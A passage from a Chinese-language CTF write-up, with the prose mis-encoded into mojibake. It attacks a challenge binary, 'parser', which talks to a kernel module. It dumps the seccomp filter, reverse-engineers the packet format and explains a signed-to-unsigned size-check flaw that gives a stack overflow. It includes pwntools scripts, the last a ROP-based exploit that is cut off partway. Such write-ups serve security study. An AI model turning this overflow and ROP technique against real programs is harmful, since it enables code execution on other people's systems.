</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
gdb -q attach <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> -ex <span class="s1">&#39;b *0x401B22&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°±èƒ½è°ƒäº†ã€‚ã€‚å®é™…ä¸Š parser è¿˜å¼€äº† sandboxï¼Œåœ¨ <code>prepare</code> ä¸­ã€‚å¦‚æœå¯ä»¥é¡ºåˆ©è·‘èµ·æ¥çš„è¯ç›´æ¥ <code>seccomp dump</code> ä¹Ÿèƒ½å‘ç°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> line  CODE  JT   JF      <span class="nv">K</span>
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
 0001: 0x15 0x00 0x0d 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0015</span>
 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto <span class="m">0005</span>
 0004: 0x15 0x00 0x0a 0xffffffff  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> 0xffffffff<span class="o">)</span> goto <span class="m">0015</span>
 0005: 0x15 0x08 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0014</span>
 0006: 0x15 0x07 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0014</span>
 0007: 0x15 0x06 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0014</span>
 0008: 0x15 0x05 0x00 0x00000003  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> close<span class="o">)</span> goto <span class="m">0014</span>
 0009: 0x15 0x04 0x00 0x00000009  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> mmap<span class="o">)</span> goto <span class="m">0014</span>
 0010: 0x15 0x03 0x00 0x0000000a  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> mprotect<span class="o">)</span> goto <span class="m">0014</span>
 0011: 0x15 0x02 0x00 0x0000000b  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> munmap<span class="o">)</span> goto <span class="m">0014</span>
 0012: 0x15 0x01 0x00 0x00000010  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> ioctl<span class="o">)</span> goto <span class="m">0014</span>
 0013: 0x06 0x00 0x00 0x00050005  <span class="k">return</span> ERRNO<span class="o">(</span>5<span class="o">)</span>
 0014: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 0015: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
</code></pre></td></tr></table>
</div>
</div><p>å½“ç„¶ï¼Œå…¶å®ç›´æ¥å…ˆæŠŠç”¨åˆ° kkk.ko çš„å…¨éƒ¨ patch æ‰ä¹Ÿè¡Œã€‚</p>
<h2 id="step1">step1</h2>
<p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ”»ç ´ç”¨æˆ·æ€ç¨‹åº parserï¼Œæ‹¿åˆ° shell or å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="åè®®é€†å‘">åè®®é€†å‘</h3>
<p>å¯¹åè®®è¿›è¡Œé€†å‘ï¼Œç»“æœå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­</p>
<h4 id="packet_hdr">packet_hdr</h4>
<p>å¤´éƒ¨ 0x30 å­—èŠ‚ï¼Œç¨‹åºç”¨ <code>get_packet_hdr</code> æ¥èµ‹å€¼ã€‚å®ƒåŒ…å«äº†è¿™äº›ä¿¡æ¯å’Œè¦æ±‚</p>
<ul>
<li><code>packet_hdr[:4]</code> éœ€è¦æ˜¯ <code>p32(0xAAA)</code></li>
<li><code>packet_hdr[4:8]</code> éœ€è¦æ˜¯ <code>p32(1)</code></li>
<li><code>packet_hdr[16:20]</code> æ˜¯ size åŸŸï¼Œ<code>size &gt; 0x877</code> åˆ™æŠ¥é”™</li>
<li><code>packet_hdr[20:24]</code> æ˜¯æ ¡éªŒå’Œï¼Œä¼šè¿‡ä¸€ä¸ª crc32</li>
</ul>
<h4 id="segment_hdr">segment_hdr</h4>
<p>ç´§è·Ÿç€æ˜¯ä¸€ä¸ª 0x8 å­—èŠ‚çš„å¤´éƒ¨ï¼Œèµ‹å€¼åœ¨ <code>get_segements</code> å‡½æ•°ä¸­ã€‚å®ƒåŒ…å«äº†è¿™äº›ä¿¡æ¯</p>
<ul>
<li><code>segment_hdr[:4]</code> æ ‡è¯†äº†åç»­ segment çš„æ®µæ•° cntï¼Œ<code>cnt &gt; 7</code> or <code>cnt &lt;= 1</code> åˆ™æŠ¥é”™</li>
<li><code>segment_hdr[4:8]</code> æ˜¯å¦ä¸€ä¸ªå¤§å°åŸŸ size2ï¼Œ<code>size2 + 0x38 &gt; size</code> åˆ™æŠ¥é”™</li>
</ul>
<h4 id="segment">segment</h4>
<p>ç„¶åå°±æ˜¯ cnt ä¸ª segmentï¼Œæ¯ä¸ª segment åŒ…å«äº†è¿™äº›ä¿¡æ¯</p>
<ul>
<li><code>segment[4:8]</code> æ˜¯è¿™ä¸ª segment å†…å®¹çš„å¤§å°åŸŸ con_sizeï¼Œ<code>con_size &gt; 0x100</code> åˆ™æŠ¥é”™ã€‚å®ƒä¼šè¿‡ä¸€ä¸ª 0x20 å­—èŠ‚å‘ä¸Šå¯¹é½çš„æ“ä½œã€‚</li>
<li><code>segment[8:]</code> æ˜¯ç”¨æˆ·éšæ„è¾“å…¥çš„å†…å®¹ï¼Œå¤§å°ä¸º con_size</li>
</ul>
<h3 id="demo">demo</h3>
<p>CRCçš„å€¼å…¶å®å¯ä»¥æ¯æ¬¡è°ƒè¯•æ‹¿åˆ°ï¼Œæ¯”å¦‚è¿™é‡Œçš„ <code>0x796f15c9</code>ã€‚å¯ä»¥è¯•ä¸€ä¸‹è¿™ä¸ª demo exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./parser&#34;</span><span class="p">)</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">cnt</span><span class="p">):</span>

    <span class="c1">### header 8 bytes</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span>
    <span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

    <span class="c1">### content size bytes</span>
    <span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x100</span>
    <span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ç¡®å®å’Œ kkk.ko äº¤äº’äº†ï¼Œäº¤äº’é¡ºåºä¸ç¨‹åºä¸€è‡´ã€‚è¯æ˜åè®®é€†å‘æ²¡ä»€ä¹ˆé—®é¢˜ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@x1do0:/home/x1do0/linux_share/actf/kkk# dmesg -c
<span class="o">[</span>61111.167379<span class="o">]</span> kkk_open<span class="o">()</span>
<span class="o">[</span>61111.173754<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173754<span class="o">]</span> KKK_IOCTL_ADD
<span class="o">[</span>61111.173755<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173755<span class="o">]</span> KKK_IOCTL_LAUNCH
<span class="o">[</span>61111.173756<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173756<span class="o">]</span> KKK_IOCTL_DUMP
<span class="o">[</span>61111.173766<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173769<span class="o">]</span> KKK_IOCTL_DETACH
<span class="o">[</span>61116.897292<span class="o">]</span> kkk_close<span class="o">()</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v11</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">next_type</span> <span class="o">=</span> <span class="o">*</span><span class="n">next_ptr</span><span class="p">;</span>
    <span class="n">next_size</span> <span class="o">=</span> <span class="n">align</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">next_con</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">next_ptr</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">cur_size</span> <span class="o">=</span> <span class="n">align</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v10</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
    <span class="n">cur_con</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">add</span><span class="p">(</span><span class="n">cur_con</span><span class="p">,</span> <span class="n">cur_size</span><span class="p">,</span> <span class="n">next_con</span><span class="p">,</span> <span class="n">next_size</span><span class="p">,</span> <span class="n">next_type</span><span class="p">);</span><span class="c1">// 0x6B64 add
</span><span class="c1"></span>    <span class="n">launch</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>                              <span class="c1">// 0x6B6B Launch
</span><span class="c1"></span>    <span class="n">next_con_2</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">next_ptr</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">cur_con_2</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">show</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">cur_con_2</span><span class="p">,</span> <span class="n">next_con_2</span><span class="p">);</span>         <span class="c1">// 0x6B69 Dump
</span><span class="c1"></span>    <span class="n">release</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>                             <span class="c1">// 0x6b6D detach
</span><span class="c1"></span>  <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="æ¼æ´">æ¼æ´</h3>
<p>åœ¨ <code>get_segements</code> ä¸­è¯»å– segment å†…å®¹çš„å¤§å°åŸŸæ—¶ï¼Œåªéœ€è¦ int å€¼ä¸å¤§äº 0x100 å°±è¡Œäº†ã€‚ä½†æ˜¯åœ¨åç»­è¯»å–ä»¥åŠ <code>parse_and_run</code> è§£ææ—¶ä¼šæŠŠè¿™ä¸ªåŸŸ è§£ææˆ unsigned intã€‚æ‰€ä»¥å¦‚æœä¸€å¼€å§‹ size èµ‹å€¼ä¸ºè´Ÿæ•°ï¼Œå®ƒèƒ½ç»•è¿‡æ£€æµ‹ï¼Œå¹¶ä¸”åœ¨åç»­è§£ææˆä¸€ä¸ªå·¨å¤§çš„ unsigned int é€ æˆæº¢å‡ºã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span>
<span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+220h] [rbp-40h]
</span><span class="c1"></span>

<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v5</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v6</span><span class="p">,</span> <span class="n">v8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">read_through_base64</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
    <span class="c1">// ...  
</span><span class="c1"></span>
    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">read_through_base64</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>    <span class="c1">// int -&gt; unsigned int
</span><span class="c1"></span>
    <span class="c1">//...
</span><span class="c1"></span>
</code></pre></td></tr></table>
</div>
</div><h3 id="åˆ©ç”¨">åˆ©ç”¨</h3>
<p>äºæ˜¯å¯ä»¥åœ¨ <code>main</code> ä¸­ <code>v4</code> å˜é‡é€ æˆæ ˆæº¢å‡ºï¼Œæ²¡å¼€ canaryã€‚å®é™…ä¸Šå¦‚æœ cnt ä¸º 1ï¼Œå®ƒè™½ç„¶ä¸ä¼šèµ°åˆ° <code>parse_and_run</code> ä½†æ˜¯å·²ç»å¯¼è‡´äº†æ ˆæº¢å‡ºã€‚å½“ç„¶ï¼Œè¾“å…¥å¤šä¸ª segment ä¹Ÿè¡Œã€‚</p>
<p>PoC å¦‚ä¸‹ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬è¾¾åˆ°äº†ç”¨æˆ·æ€ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®æ ‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages&#39;</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg&#39;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>


<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">con</span><span class="p">))</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./parser&#34;</span><span class="p">)</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>


<span class="c1">### header 8 bytes</span>
<span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span>
<span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

<span class="c1">### content size bytes</span>

<span class="c1"># 0x00000000004006a6 : pop rdi ; ret</span>
<span class="c1"># 0x000000000045c139 : pop rdx ; pop rsi ; ret</span>
<span class="c1"># 0x00000000004005af : pop rax ; ret</span>
<span class="c1"># 0x00000000004859c5 : syscall ; ret</span>


<span class="c1"># mprotect(buf, 0x1000, 4|2|1)</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x6DB4A0</span>

